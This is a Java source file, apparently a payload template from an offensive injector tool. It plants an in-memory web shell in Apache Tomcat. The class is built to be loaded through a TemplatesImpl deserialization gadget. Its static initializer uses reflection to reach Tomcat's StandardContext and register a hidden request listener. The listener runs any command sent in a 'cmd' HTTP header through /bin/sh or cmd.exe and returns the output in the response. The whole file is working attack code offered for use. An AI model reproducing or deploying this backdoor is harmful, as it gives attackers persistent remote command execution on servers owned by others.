package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.apache.catalina.connector.Request;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

public class TomcatListenerTemplate extends AbstractTranslet {
    static {
        try {
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
                lastServicedResponseField.set(null, new ThreadLocal<>());
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
            } else {
                String name = "RoboTerh";
                //从req中获取ServletContext对象
                // 第二次请求后进入 else 代码块，获取 Request 和 Response 对象，写入回显
                ServletRequest servletRequest = lastServicedRequest.get();

                ServletContext servletContext = servletRequest.getServletContext();

//                ServletContext servletContext = req.getServletContext();
                StandardContext o = null;
                while (o == null) { //循环从servletContext中取出StandardContext
                    Field field = servletContext.getClass().getDeclaredField("context");
                    field.setAccessible(true);
                    Object o1 = field.get(servletContext);

                    if (o1 instanceof ServletContext) {
                        servletContext = (ServletContext) o1;
                    } else if (o1 instanceof StandardContext) {
                        o = (StandardContext) o1;
                    }
                }
                Mylistener mylistener = new Mylistener();
                //添加listener
                o.addApplicationEventListener(mylistener);
            }
        } catch (Exception e) {
            //ignore
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

class Mylistener implements ServletRequestListener {

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        ServletRequest request = servletRequestEvent.getServletRequest();
        HttpServletRequest servletRequest = (HttpServletRequest) request;
        if (servletRequest.getHeader("cmd") != null) {
            try {
                String cmd = servletRequest.getHeader("cmd");
                boolean isLinux = true;
                String osType = System.getProperty("os.name");
                if (osType != null && osType.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(inputStream).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                Field request1 = request.getClass().getDeclaredField("request");
                request1.setAccessible(true);
                Request request2 = (Request) request1.get(request);
                request2.getResponse().getWriter().write(output);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {

    }
}